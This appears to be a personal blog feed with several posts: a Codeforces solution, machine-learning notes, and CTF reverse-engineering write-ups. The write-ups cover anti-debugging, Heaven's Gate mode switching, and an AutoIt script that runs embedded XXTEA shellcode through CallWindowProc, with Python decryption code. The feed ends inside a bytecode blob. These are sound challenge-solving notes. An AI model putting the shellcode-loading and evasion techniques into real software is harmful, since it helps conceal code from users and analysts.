<h5 id="The-basic-solution-for-this-problem-is-to-find-out-if-there-are-numbers-bigger-then-a-i-if-so-the-guy-with-the-number-i-CAN-NOT-WIN-ANYBODY-else-tried-to-find-the-number-of-the-guys-AFTER-HIM-with-smaller-a-This-number-is-the-BIGGEST-number-of-his-victories-You-might-notices-if-the-guy-is-the-best-in-the-whole-queue-then-he-can-win-any-guys-he-met-depend-how-big-the-k-is-others-can-not-because-they-may-met-this-guy-and-his-game-can-be-called-“over”"><a href="#The-basic-solution-for-this-problem-is-to-find-out-if-there-are-numbers-bigger-then-a-i-if-so-the-guy-with-the-number-i-CAN-NOT-WIN-ANYBODY-else-tried-to-find-the-number-of-the-guys-AFTER-HIM-with-smaller-a-This-number-is-the-BIGGEST-number-of-his-victories-You-might-notices-if-the-guy-is-the-best-in-the-whole-queue-then-he-can-win-any-guys-he-met-depend-how-big-the-k-is-others-can-not-because-they-may-met-this-guy-and-his-game-can-be-called-“over”" class="headerlink" title="The basic solution for this problem is to find out if there are numbers bigger then a[i], if so, the guy with the number i CAN NOT WIN ANYBODY, else, tried to find the number of the guys AFTER HIM with smaller a[]. This number is the BIGGEST number of his victories. You might notices, if the guy is the best in the whole queue, then he can win any guys he met(depend how big the k is), others can not because they may met this guy and his game can be called “over”."></a>The basic solution for this problem is to find out if there are numbers bigger then a[i], if so, the guy with the number i CAN NOT WIN ANYBODY, else, tried to find the number of the guys AFTER HIM with smaller a[]. This number is the BIGGEST number of his victories. You might notices, if the guy is the best in the whole queue, then he can win any guys he met(depend how big the k is), others can not because they may met this guy and his game can be called “over”.</h5><h4 id="DETAILS"><a href="#DETAILS" class="headerlink" title="DETAILS"></a>DETAILS</h4><ul>
<li><h5 id="The-first-and-second-guy-is-special-They-fight-each-other-You-can-see-that-i-gt-x3D-2-can-use-the-same-formula-So-you-shall-judge-i-x3D-x3D-1-specially-The-biggest-a-shall-also-be-judge-specially-With-those-you-answer-shall-be-right"><a href="#The-first-and-second-guy-is-special-They-fight-each-other-You-can-see-that-i-gt-x3D-2-can-use-the-same-formula-So-you-shall-judge-i-x3D-x3D-1-specially-The-biggest-a-shall-also-be-judge-specially-With-those-you-answer-shall-be-right" class="headerlink" title="The first and second guy is special. They fight each other. You can see that (i&gt;&#x3D;2) can use the same formula. So you shall judge (i&#x3D;&#x3D;1) specially. The biggest a[] shall also be judge specially. With those, you answer shall be right."></a>The first and second guy is special. They fight each other. You can see that (i&gt;&#x3D;2) can use the same formula. So you shall judge (i&#x3D;&#x3D;1) specially. The biggest a[] shall also be judge specially. With those, you answer shall be right.</h5></li>
<li><h5 id="However-you-might-get-a-“TLE”-Well-I-did-This-is-how-I-wrote-previously"><a href="#However-you-might-get-a-“TLE”-Well-I-did-This-is-how-I-wrote-previously" class="headerlink" title="However, you might get a “TLE”(Well,I did). This is how I wrote previously:"></a>However, you might get a “TLE”(Well,I did). This is how I wrote previously:</h5><code>//		for (i=1;i&lt;=n;i++)&#123;</code>	<br><code>//			if (a[i]==maxn) continue;</code><br><code>//			for (j=i+1;j&lt;=n;j++)&#123;</code><br><code>//				if (a[j]&gt;=a[i]) break;</code><br><code>//				b[i]++;</code><br><code>//&#125;</code><br><code>//			b[i]++;</code><br><code>//			if (i==1) b[i]--;</code><br><code>//			for (j=1;j&lt;i;j++)&#123;</code><br><code>//				if (a[j]&gt;a[i])&#123;</code><br><code>//					b[i]=0;</code><br><code>//					break;</code><br><code>//				&#125;</code><br><code>//			&#125;</code><br><code>//		&#125;</code></li>
</ul>
<h5 id="Clearly-O-n-2-is-too-slow-So-I-tried-to-find-another-way"><a href="#Clearly-O-n-2-is-too-slow-So-I-tried-to-find-another-way" class="headerlink" title="Clearly, O(n^2) is too slow. So I tried to find another way."></a>Clearly, O(n^2) is too slow. So I tried to find another way.</h5><h5 id="We-can-find-that-the-whole-work-can-be-done-in-LINEAR-TIME-Like-this"><a href="#We-can-find-that-the-whole-work-can-be-done-in-LINEAR-TIME-Like-this" class="headerlink" title="We can find that the whole work can be done in LINEAR TIME. Like this:"></a>We can find that the whole work can be done in LINEAR TIME. Like this:</h5><p><code>		int lld=1;</code><br><code>		for (i=1;i&lt;n;i++)&#123;</code><br><code>			if (a[i]&gt;a[i+1])&#123;</code><br><code>				b[lld]++;</code><br><code>				a[i+1]=a[i];</code><br><code>			&#125;</code><br><code>			else&#123;</code><br><code>				lld=i+1;</code><br><code>				b[lld]++;</code><br><code>			&#125;</code><br><code>		&#125;</code></p>
<h5 id="It’s-not-hard-to-understand-but-effective-Just-read-it-once-in-O-n-the-work-is-done"><a href="#It’s-not-hard-to-understand-but-effective-Just-read-it-once-in-O-n-the-work-is-done" class="headerlink" title="It’s not hard to understand, but effective. Just read it once(in O(n)), the work is done."></a>It’s not hard to understand, but effective. Just read it once(in O(n)), the work is done.</h5>]]></content>
      <tags>
        <tag>codeforces</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>cpp虚表逆向初探</title>
    <url>/2023/10/12/cpp%E8%99%9A%E8%A1%A8%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="PREFACE：起因是近年flare-on的一个题疑似用的虚表（实际上好像不是，不过刚好看见就来研究一下）"><a href="#PREFACE：起因是近年flare-on的一个题疑似用的虚表（实际上好像不是，不过刚好看见就来研究一下）" class="headerlink" title="PREFACE：起因是近年flare-on的一个题疑似用的虚表（实际上好像不是，不过刚好看见就来研究一下）"></a>PREFACE：起因是近年flare-on的一个题疑似用的虚表（实际上好像不是，不过刚好看见就来研究一下）</h6><span id="more"></span>

<p>修复方法可以看这篇，挺好用的：<a href="https://www.anquanke.com/post/id/85201">【技术分享】逆向C++虚函数（一）-安全客 - 安全资讯平台 (anquanke.com)</a></p>
]]></content>
  </entry>
  <entry>
    <title>d3ctf 2023</title>
    <url>/2023/07/11/d3ctf-2023/</url>
    <content><![CDATA[<h6 id="好久没写blog了QAQ，受到某人启发觉得有空还是写写，多少动动笔吧。本来是打算先写安卓学习的那篇，想着找个题复现吧，回来看看d3那个写不明白的android，结果一看d3好几个题读作solved，写作看一眼毫无印象，遂决定回来重新做一次"><a href="#好久没写blog了QAQ，受到某人启发觉得有空还是写写，多少动动笔吧。本来是打算先写安卓学习的那篇，想着找个题复现吧，回来看看d3那个写不明白的android，结果一看d3好几个题读作solved，写作看一眼毫无印象，遂决定回来重新做一次" class="headerlink" title="好久没写blog了QAQ，受到某人启发觉得有空还是写写，多少动动笔吧。本来是打算先写安卓学习的那篇，想着找个题复现吧，回来看看d3那个写不明白的android，结果一看d3好几个题读作solved，写作看一眼毫无印象，遂决定回来重新做一次"></a>好久没写blog了QAQ，受到某人启发觉得有空还是写写，多少动动笔吧。本来是打算先写安卓学习的那篇，想着找个题复现吧，回来看看d3那个写不明白的android，<del>结果一看d3好几个题读作solved，写作看一眼毫无印象</del>，遂决定回来重新做一次</h6><span id="more"></span>
<h2 id="d3hell-attachment"><a href="#d3hell-attachment" class="headerlink" title="d3hell_attachment"></a>d3hell_attachment</h2><p><img src="/2023/07/11/d3ctf-2023/image-20230711190621273.png" alt="image-20230711190621273"></p>
<p>首先这里的d3runtime.dll就够可疑的了，调起来就有点印象。先在main开头断下来，果不其然modules里面的d3runtime.dll里面的东西很可疑</p>
<p><img src="/2023/07/11/d3ctf-2023/image-20230711191017764.png" alt="image-20230711191017764"></p>
<p>之前自己弄过一点dll加载相关的出题（后面有空写个blog记录一下，<del>希望不鸽,虽然已经鸽了半年</del>）这个位置直接调有时候窗口不会自己跳转过来，这里函数不多，直接往每个函数开头下断点</p>
<p>main里面的sleep常规nop掉，下面的逻辑看着是在骗人，真正的逻辑在dll里</p>
<p>胆大的直接F9，出锅了，调了调发现卡在sub_40216A，重来</p>
<p>压根没进main，tls_callback就把dll起起来了（第一遍动态的时候在dll下了断点，第二遍就直接发现了）</p>
<p>直接进了<code>d3runtime__61FC1628</code>看不出来啥用，有点像花但不能nop的</p>
<p><img src="/2023/07/11/d3ctf-2023/image-20230711192346716.png" alt="image-20230711192346716"></p>
<p>感觉是故意的…编译器会这么优化么…不能删这里，逻辑是中间的mov 和add 走两次，下面有个一样的操作</p>
<p>谁教的……</p>
<p>不能F5，单步往下</p>
<p>而后<code>d3runtime__61FC1578</code>函数，TEA加密，但是不知道啥用，接着调</p>
<p><img src="/2023/07/11/d3ctf-2023/image-20230711192920527.png" alt="image-20230711192920527"></p>
<p>这里上了反调，直接过掉，但是后面的代码很奇怪，明显反编译有问题，重调</p>
<p>注意到一个很奇怪的事情，这里：</p>
<p><img src="/2023/07/11/d3ctf-2023/image-20230711194724759.png" alt="image-20230711194724759"></p>
<p>合理的话按照上面相同的写法，应该是<code>E8 00 00 00 00</code>，但是这里少了一个00，一开始以为可以不需要，但是想想不对。这里怎么想都应该是<code>call $5</code>的操作，然后后面可以还原出上面的逻辑</p>
<p>哦，动动脑子，这里换32-bit了，天堂之门，对应题目hell</p>
<p>这里确实萌新没接触过天堂之门的，没从<code>tls</code>和<code>DllMainCRTStartup</code>里看出什么端倪，但是总归这里是32bit，那dump下来放进ida里看看，呜哇，修了半个小时修不明白</p>
<p>那也可以硬调吧，不妨碍，既然他能运行那姑且也可以调</p>
<p><img src="/2023/07/11/d3ctf-2023/image-20230711200137667.png" alt="image-20230711200137667"></p>
<p>调dll的确实…<del>不知道谁也出过类似的恶心题目</del></p>
<p>但是主逻辑有了的，下面<code>isdebuggerpresent</code>给他拿掉，这里主要是V0没有识别出来，跳转的时候没有找到jmp的位置，否则不会有那么多逃逸变量…</p>
<p>勉强可以辨认这里修改的表</p>
<p>回到main里，实际操作也就这里面：</p>
<p><img src="/2023/07/11/d3ctf-2023/image-20230711200826897.png" alt="image-20230711200826897"></p>
<p><code>byte_405060</code>刚才在dll已经走过了，差这个flag表，应当在这里走走：</p>
<p><img src="/2023/07/11/d3ctf-2023/image-20230711201100046.png" alt="image-20230711201100046"></p>
<p>再往前推么发现跟v12有关，于是牵扯到了<code>sub_40216A</code>，这里确实确实看不懂了，即使出题人好心没去结构体的符号表…</p>
<p>先说结论，这里是大整数分解。其次，看的别人的wp知道的</p>
<p>结论是这里把换后的表带入大整数分解，得到的两段拼接起来是flag…</p>
<h6 id="合着练了一下动调……实话说目前算是做不出来这个题的……"><a href="#合着练了一下动调……实话说目前算是做不出来这个题的……" class="headerlink" title="合着练了一下动调……实话说目前算是做不出来这个题的……"></a>合着练了一下动调……实话说目前算是做不出来这个题的……</h6><h6 id="嗯，天堂之门有空来写一个试试…-参考-原创-天堂之门-Heaven’s-Gate-C语言实现-软件逆向-看雪-安全社区-安全招聘-kanxue-com"><a href="#嗯，天堂之门有空来写一个试试…-参考-原创-天堂之门-Heaven’s-Gate-C语言实现-软件逆向-看雪-安全社区-安全招聘-kanxue-com" class="headerlink" title="嗯，天堂之门有空来写一个试试…[参考]([原创]天堂之门 (Heaven’s Gate) C语言实现-软件逆向-看雪-安全社区|安全招聘|kanxue.com)"></a>嗯，天堂之门有空来写一个试试…[参考]([<a href="https://bbs.kanxue.com/thread-270153.htm">原创]天堂之门 (Heaven’s Gate) C语言实现-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a>)</h6><h6 id="结论，有经验的话就不算难题，但是初见还挺可怕的"><a href="#结论，有经验的话就不算难题，但是初见还挺可怕的" class="headerlink" title="结论，有经验的话就不算难题，但是初见还挺可怕的"></a>结论，有经验的话就不算难题，但是初见还挺可怕的</h6><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
  </entry>
  <entry>
    <title>cv与一些classify事项记录</title>
    <url>/2023/07/17/cv%E4%B8%8E%E4%B8%80%E4%BA%9Bclassify%E4%BA%8B%E9%A1%B9%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h6 id="preface-一些project记录，慢慢学吧调参炼丹"><a href="#preface-一些project记录，慢慢学吧调参炼丹" class="headerlink" title="preface:一些project记录，慢慢学吧调参炼丹"></a>preface:一些project记录，慢慢学吧调参炼丹</h6><span id="more"></span>

<h5 id="需要实现的功能是接收树莓派传过来的植物图像，对其是否病害进行分类预测，用的训练集是-这个-病虫害分类数据集-飞桨AI-Studio-baidu-com-，训练集的话需要写一个加载json数据的方法"><a href="#需要实现的功能是接收树莓派传过来的植物图像，对其是否病害进行分类预测，用的训练集是-这个-病虫害分类数据集-飞桨AI-Studio-baidu-com-，训练集的话需要写一个加载json数据的方法" class="headerlink" title="需要实现的功能是接收树莓派传过来的植物图像，对其是否病害进行分类预测，用的训练集是[这个](病虫害分类数据集 - 飞桨AI Studio (baidu.com))，训练集的话需要写一个加载json数据的方法"></a>需要实现的功能是接收树莓派传过来的植物图像，对其是否病害进行分类预测，用的训练集是[这个](<a href="https://aistudio.baidu.com/aistudio/datasetdetail/76075">病虫害分类数据集 - 飞桨AI Studio (baidu.com)</a>)，训练集的话需要写一个加载json数据的方法</h5><pre><code class="python">def create_image_folders_by_class(json_file_path, image_folder_path, output_folder_path):
    with open(json_file_path, &#39;r&#39;) as f:
        labels_data = json.load(f)

    # 分割训练集和验证集
    train_data, val_data = train_test_split(labels_data, test_size=0.2, random_state=42)

    for name, data in [(&#39;train&#39;, train_data), (&#39;val&#39;, val_data)]:
        for item in data:
            class_folder = os.path.join(output_folder_path, name, str(item[&#39;disease_class&#39;]))
            os.makedirs(class_folder, exist_ok=True)
            shutil.copy(os.path.join(image_folder_path, item[&#39;image_id&#39;]), os.path.join(class_folder, item[&#39;image_id&#39;]))
</code></pre>
<h5 id="最开始使用的是ResNet50，后面感觉正确率太低了会不会跟模型有关，改成densenet169，效果是差不太多…"><a href="#最开始使用的是ResNet50，后面感觉正确率太低了会不会跟模型有关，改成densenet169，效果是差不太多…" class="headerlink" title="最开始使用的是ResNet50，后面感觉正确率太低了会不会跟模型有关，改成densenet169，效果是差不太多…"></a>最开始使用的是ResNet50，后面感觉正确率太低了会不会跟模型有关，改成densenet169，效果是差不太多…</h5><h5 id="还发现一个小问题，数据集里面都是带病的植物class，好像没有健康的…"><a href="#还发现一个小问题，数据集里面都是带病的植物class，好像没有健康的…" class="headerlink" title="还发现一个小问题，数据集里面都是带病的植物class，好像没有健康的…"></a>还发现一个小问题，数据集里面都是带病的植物class，好像没有健康的…</h5><h5 id="于是乎感觉反正准确率偏低了，干脆根据置信度分一类专门来判别没病的植物么得，重写一些训模型的部分，log一下平均置信度和方差，然后假装正则大概放一个置信度来判别"><a href="#于是乎感觉反正准确率偏低了，干脆根据置信度分一类专门来判别没病的植物么得，重写一些训模型的部分，log一下平均置信度和方差，然后假装正则大概放一个置信度来判别" class="headerlink" title="于是乎感觉反正准确率偏低了，干脆根据置信度分一类专门来判别没病的植物么得，重写一些训模型的部分，log一下平均置信度和方差，然后假装正则大概放一个置信度来判别"></a>于是乎感觉反正准确率偏低了，干脆根据置信度分一类专门来判别没病的植物么得，重写一些训模型的部分，log一下平均置信度和方差，然后假装正则大概放一个置信度来判别</h5><p><img src="/2023/07/17/cv%E4%B8%8E%E4%B8%80%E4%BA%9Bclassify%E4%BA%8B%E9%A1%B9%E8%AE%B0%E5%BD%95/image-20230717164424184.png" alt="image-20230717164424184"></p>
<h5 id="大概大概这样子吧"><a href="#大概大概这样子吧" class="headerlink" title="大概大概这样子吧"></a>大概大概这样子吧</h5><pre><code class="python">def predict_image(image_path):
    img = Image.open(image_path)
    img = data_transform(img).unsqueeze(0)
    img = img.to(device)
    output = model(img)
    probs = torch.nn.functional.softmax(output, dim=1)
    max_prob, preds = torch.max(probs, 1)

    # print(max_prob)
    threshold = 0.7
    if max_prob &lt; threshold:
        return &#39;Low confidence&#39;
    else:
        return preds
</code></pre>
<h5 id="最后正确率还是很一眼难尽，目前是没做数据增强的，应该是不能变太多，主要是病害植物和普通植物确实分类不明显，暂且原谅这程序的低准确率…"><a href="#最后正确率还是很一眼难尽，目前是没做数据增强的，应该是不能变太多，主要是病害植物和普通植物确实分类不明显，暂且原谅这程序的低准确率…" class="headerlink" title="最后正确率还是很一眼难尽，目前是没做数据增强的，应该是不能变太多，主要是病害植物和普通植物确实分类不明显，暂且原谅这程序的低准确率…"></a>最后正确率还是很一眼难尽，目前是没做数据增强的，应该是不能变太多，主要是病害植物和普通植物确实分类不明显，暂且原谅这程序的低准确率…</h5><h5 id="mark一个奇怪的事情：训练模型过程中每个epoch正确率都还不错有50左右，存好model以后再测试正确率就掉到个位数。"><a href="#mark一个奇怪的事情：训练模型过程中每个epoch正确率都还不错有50左右，存好model以后再测试正确率就掉到个位数。" class="headerlink" title="mark一个奇怪的事情：训练模型过程中每个epoch正确率都还不错有50左右，存好model以后再测试正确率就掉到个位数。"></a>mark一个奇怪的事情：训练模型过程中每个epoch正确率都还不错有50左右，存好model以后再测试正确率就掉到个位数。</h5><h6 id="7-18更新"><a href="#7-18更新" class="headerlink" title="*7-18更新"></a>*7-18更新</h6><h5 id="本来dl部分给的数据做的极端处理是mean值-三倍标准差，结果在测温湿度之类的1h内数据根本不变化，导致classifier基本上不工作……这边选择改成手动给调极端数据来训分类器了…"><a href="#本来dl部分给的数据做的极端处理是mean值-三倍标准差，结果在测温湿度之类的1h内数据根本不变化，导致classifier基本上不工作……这边选择改成手动给调极端数据来训分类器了…" class="headerlink" title="本来dl部分给的数据做的极端处理是mean值+-三倍标准差，结果在测温湿度之类的1h内数据根本不变化，导致classifier基本上不工作……这边选择改成手动给调极端数据来训分类器了…"></a>本来dl部分给的数据做的极端处理是mean值+-三倍标准差，结果在测温湿度之类的1h内数据根本不变化，导致classifier基本上不工作……这边选择改成手动给调极端数据来训分类器了…</h5><h6 id="7-27更新（补）"><a href="#7-27更新（补）" class="headerlink" title="*7-27更新（补）"></a>*7-27更新（补）</h6><h5 id="最后更新了label的方法，加入了adam优化，最终准确率94"><a href="#最后更新了label的方法，加入了adam优化，最终准确率94" class="headerlink" title="最后更新了label的方法，加入了adam优化，最终准确率94%"></a>最后更新了label的方法，加入了adam优化，最终准确率94%</h5><p><img src="/2023/07/17/cv%E4%B8%8E%E4%B8%80%E4%BA%9Bclassify%E4%BA%8B%E9%A1%B9%E8%AE%B0%E5%BD%95/image-20230727115911697.png" alt="image-20230727115911697"></p>
<h6 id="（实测效果也是不错来的，有点点过于灵敏，置信度给的不准，实际使用稍微要求有点严苛）"><a href="#（实测效果也是不错来的，有点点过于灵敏，置信度给的不准，实际使用稍微要求有点严苛）" class="headerlink" title="（实测效果也是不错来的，有点点过于灵敏，置信度给的不准，实际使用稍微要求有点严苛）"></a>（实测效果也是不错来的，有点点过于灵敏，置信度给的不准，实际使用稍微要求有点严苛）</h6><h6 id="不过背景处理啥的还学不太明白，也没啥时间，就先这样子了"><a href="#不过背景处理啥的还学不太明白，也没啥时间，就先这样子了" class="headerlink" title="不过背景处理啥的还学不太明白，也没啥时间，就先这样子了"></a>不过背景处理啥的还学不太明白，也没啥时间，就先这样子了</h6>]]></content>
      <tags>
        <tag>cv</tag>
      </tags>
  </entry>
  <entry>
    <title>das202310</title>
    <url>/2023/10/25/das202310/</url>
    <content><![CDATA[<h6 id="PREFACE：yysy没咋认真在做，同时的n1ctf有点难了，加上早上起来心态有点差"><a href="#PREFACE：yysy没咋认真在做，同时的n1ctf有点难了，加上早上起来心态有点差" class="headerlink" title="PREFACE：yysy没咋认真在做，同时的n1ctf有点难了，加上早上起来心态有点差"></a>PREFACE：yysy没咋认真在做，同时的n1ctf有点难了，加上早上起来心态有点差</h6><span id="more"></span>

<h3 id="auuuu3"><a href="#auuuu3" class="headerlink" title="auuuu3"></a>auuuu3</h3><p>autoit3编译的，需要专门反编译出来会比较好</p>
<p>这里用的AutoEye，效果挺好的，找到核心逻辑</p>
<pre><code class="asm">
Func enc($data, $key)
$data = Binary($data)
Local $datalen = BinaryLen($data)
If $datalen = 0 Then
Return &#39;&#39;
ElseIf $datalen &lt; 8 Then
$datalen = 8
EndIf
Local $opcode = &quot;0x83EC14B83400000099538B5C2420558B6C242056578B7C9DFCF7FB89C683C606C74424180000000085F68D76FF0F8EEA000000896C24288D4BFF8D549D00894C2410895424148974242081442418B979379E8B4C2418C1E90281E103000000894C241C31F6397424107E568B5424288BCF8B6CB204C1E9058D14AD0000000033CA8BD58BC7C1EA03C1E00433D003CA8B5424188BDE81E303000000335C241C8B4424308B1C9833D533DF03D333CA8B542428010CB28B0CB2463974241089CF7FAA8B5424288BCF8B2AC1E9058D14AD0000000033CA8BD58BC7C1EA03C1E00433D003CA8B5424188BDE81E303000000335C241C8B4424308B1C9833D533DF03D3FF4C242033CA8B542414014AFC8B4AFC8B54242089CF420F8F2DFFFFFF5F31C05E5D5B83C414C21000&quot;
Local $codebuffer = DllStructCreate(&quot;byte[&quot; &amp; BinaryLen($opcode) &amp; &quot;]&quot;)
DllStructSetData($codebuffer, 1, $opcode)
Local $v = DllStructCreate(&quot;byte[&quot; &amp; Ceiling($datalen / 4) * 4 &amp; &quot;]&quot;)
DllStructSetData($v, 1, $data)
Local $k = DllStructCreate(&quot;byte[16]&quot;)
DllStructSetData($k, 1, $key)
DllCall(&quot;user32.dll&quot;, &quot;none&quot;, &quot;CallWindowProc&quot;, &quot;ptr&quot;, DllStructGetPtr($codebuffer), &quot;ptr&quot;, DllStructGetPtr($v), &quot;int&quot;, Ceiling($datalen / 4), &quot;ptr&quot;, DllStructGetPtr($k), &quot;int&quot;, 0)
Local $ret = DllStructGetData($v, 1)
$codebuffer = 0
$v = 0
$k = 0
Return $ret
EndFunc

$form1 = GUICreate(&quot;auuuu3&quot;, 378, 185, 254, 182)
GUICtrlSetFont(-1, 14, 400, 0, &quot;MS Sans Serif&quot;)
$serial = GUICtrlCreateInput(&#39;&#39;, 56, 48, 257, 21)
$check = GUICtrlCreateButton(&quot;Check&quot;, 56, 80, 257, 33)
GUISetState(@SW_SHOW)
While 1
$nmsg = GUIGetMsg()
Switch $nmsg
Case $GUI_EVENT_CLOSE
Exit
Case $check
Dim $ciphertext = &quot;0x7218181A02F79F4B5773E8FFE83FE732DF96259FF2B86AAB945468A132A83D83CF9D750E316C8675&quot;
$key = &quot;Wowww111auUu3&quot;
$str = GUICtrlRead($serial)
If StringLen($str) &lt;&gt; 38 Then
MsgBox(&#39;&#39;, &#39;&#39;, &quot;wrong&quot;)
ContinueCase
EndIf
$encrypt = enc($str, $key)
If $encrypt == $ciphertext Then
MsgBox(&#39;&#39;, &#39;&#39;, &quot;correct&quot;)
ContinueCase
EndIf
MsgBox(&#39;&#39;, &#39;&#39;, &quot;wrong&quot;)
EndSwitch
WEnd
</code></pre>
<p>这里key和enc都有了，opcode一眼看上去就是shellcode（对齐的0太多了）</p>
<p>提取，发现是xxtea</p>
<p><img src="/2023/10/25/das202310/image-20231025103224793.png" alt="image-20231025103224793"></p>
<pre><code class="python">from ctypes import *
import struct

def MX(z, y, total, key, p, e):
    temp1 = (z.value &gt;&gt; 5 ^ y.value &lt;&lt; 2) + (y.value &gt;&gt; 3 ^ z.value &lt;&lt; 4)
    temp2 = (total.value ^ y.value) + (key[(p &amp; 3) ^ e.value] ^ z.value)

    return c_uint32(temp1 ^ temp2)


def encrypt(n, v, key):
    delta = -1640531527
    rounds = 6 + 52 // n

    total = c_uint32(0)
    z = c_uint32(v[n - 1])
    e = c_uint32(0)

    while rounds &gt; 0:
        total.value += delta
        e.value = (total.value &gt;&gt; 2) &amp; 3
        for p in range(n - 1):
            y = c_uint32(v[p + 1])
            v[p] = c_uint32(v[p] + MX(z, y, total, key, p, e).value).value
            z.value = v[p]
        y = c_uint32(v[0])
        v[n - 1] = c_uint32(v[n - 1] + MX(z, y, total, key, n - 1, e).value).value
        z.value = v[n - 1]
        rounds -= 1

    return v


def decrypt(n, v, key):
    delta = -1640531527
    rounds = 6 + 52 // n

    total = c_uint32(rounds * delta)
    y = c_uint32(v[0])
    e = c_uint32(0)

    while rounds &gt; 0:
        e.value = (total.value &gt;&gt; 2) &amp; 3
        for p in range(n - 1, 0, -1):
            z = c_uint32(v[p - 1])
            v[p] = c_uint32((v[p] - MX(z, y, total, key, p, e).value)).value
            y.value = v[p]
        z = c_uint32(v[n - 1])
        v[0] = c_uint32(v[0] - MX(z, y, total, key, 0, e).value).value
        y.value = v[0]
        total.value -= delta
        rounds -= 1

    return v

if __name__ == &quot;__main__&quot;:
    v = [0x1A181872, 0x4B9FF702, 0xFFE87357, 0x32E73FE8, 0x9F2596DF, 0xAB6AB8F2, 0xA1685494, 0x833DA832, 0x0E759DCF, 0x75866C31]
    key = &quot;Wowww111auUu3&quot;
    key_bytes = key.encode(&#39;utf-8&#39;)
    k = [int.from_bytes(key_bytes[i * 4:i * 4 + 4], &#39;little&#39;) for i in range(4)]
    n = 10
    res = decrypt(n, v, k)
    a = &#39;&#39;
    for i in range(n):
        packed = struct.pack(&#39;&lt;I&#39;, res[i])
        flag = struct.unpack(&#39;&gt;I&#39;, packed)
        a += hex(flag[0])[2:]
    a = [chr(int(a[i:i+2], 16)) for i in range(0, len(a), 2)]
    a = &#39;&#39;.join(a)
    print(a)
</code></pre>
<h3 id="marshal"><a href="#marshal" class="headerlink" title="marshal"></a>marshal</h3><p>一开始以为和上次<code>Seccon 2023</code>的<code>Sickle</code>一样需要自己改源码print</p>
<p>结果只是一个marshal套娃…</p>
<p>这下不仅想多，还坑了队友…</p>
<p>提取字节码：</p>
<pre><code class="python">import marshal
import dis

code = [b&#39;&#39; for i in range(10)]

code[0] = b&#39;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00@\x00\x00\x00s\xe2\x00\x00\x00d\x00d\x01d\x02d\x03d\x04d\x05d\x06d\x07d\x08d\td\nd\x0bd\x0cd\rd\x0ed\x0fg\x10Z\x00d\x10d\x11\x84\x00e\x01d\x12\x83\x01D\x00\x83\x01Z\x02d\x05d\x12d\x13d\x14d\x0ed\x15d\x16d\x17d\x0fd\x18d\x19d\x1ad\x08d\x1bd\x1cd\x1dd\x0cd\x1ed\x1fd d\x01d!d&quot;d#d\x02d$d%d&amp;d\rd\&#39;d(d)d\x0bd*d+d,d\x04d-d.d/d\x06d0d1d2d\x03d3d4d5d\x00d6d7d8d\x07d9d:d;d\td&lt;d=d&gt;d\nd?d@dAg@Z\x03dBd\x11\x84\x00e\x01dC\x83\x01D\x00\x83\x01Z\x04e\x05\xa0\x06dD\xa1\x01Z\x07e\x08e\x07\x83\x01\x01\x00dES\x00)F\xe9\x0c\x00\x00\x00\xe9\x05\x00\x00\x00\xe9\x06\x00\x00\x00\xe9\x0b\x00\x00\x00\xe9\t\x00\x00\x00\xe9\x00\x00\x00\x00\xe9\n\x00\x00\x00\xe9\r\x00\x00\x00\xe9\x03\x00\x00\x00\xe9\x0e\x00\x00\x00\xe9\x0f\x00\x00\x00\xe9\x08\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x07\x00\x00\x00\xe9\x01\x00\x00\x00\xe9\x02\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00g\x00|\x00]\x0e&#125;\x01t\x00\xa0\x01|\x01\xa1\x01\x91\x02q\x04S\x00\xa9\x00)\x02\xda\x04Sbox\xda\x05index\xa9\x02\xda\x02.0\xda\x01xr\x10\x00\x00\x00r\x10\x00\x00\x00\xda\x00\xda\n&lt;listcomp&gt;\x04\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00r\x17\x00\x00\x00\xe9\x10\x00\x00\x00\xe9 \x00\x00\x00\xe90\x00\x00\x00\xe9\x11\x00\x00\x00\xe9!\x00\x00\x00\xe91\x00\x00\x00\xe9\x12\x00\x00\x00\xe9&quot;\x00\x00\x00\xe92\x00\x00\x00\xe9\x13\x00\x00\x00\xe9#\x00\x00\x00\xe93\x00\x00\x00\xe9\x14\x00\x00\x00\xe9$\x00\x00\x00\xe94\x00\x00\x00\xe9\x15\x00\x00\x00\xe9%\x00\x00\x00\xe95\x00\x00\x00\xe9\x16\x00\x00\x00\xe9&amp;\x00\x00\x00\xe96\x00\x00\x00\xe9\x17\x00\x00\x00\xe9\&#39;\x00\x00\x00\xe97\x00\x00\x00\xe9\x18\x00\x00\x00\xe9(\x00\x00\x00\xe98\x00\x00\x00\xe9\x19\x00\x00\x00\xe9)\x00\x00\x00\xe99\x00\x00\x00\xe9\x1a\x00\x00\x00\xe9*\x00\x00\x00\xe9:\x00\x00\x00\xe9\x1b\x00\x00\x00\xe9+\x00\x00\x00\xe9;\x00\x00\x00\xe9\x1c\x00\x00\x00\xe9,\x00\x00\x00\xe9&lt;\x00\x00\x00\xe9\x1d\x00\x00\x00\xe9-\x00\x00\x00\xe9=\x00\x00\x00\xe9\x1e\x00\x00\x00\xe9.\x00\x00\x00\xe9&gt;\x00\x00\x00\xe9\x1f\x00\x00\x00\xe9/\x00\x00\x00\xe9?\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00g\x00|\x00]\x0e&#125;\x01t\x00\xa0\x01|\x01\xa1\x01\x91\x02q\x04S\x00r\x10\x00\x00\x00)\x02\xda\x04PBoxr\x12\x00\x00\x00r\x13\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00r\x16\x00\x00\x00r\x17\x00\x00\x00\t\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00\xe9@\x00\x00\x00s#\n\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\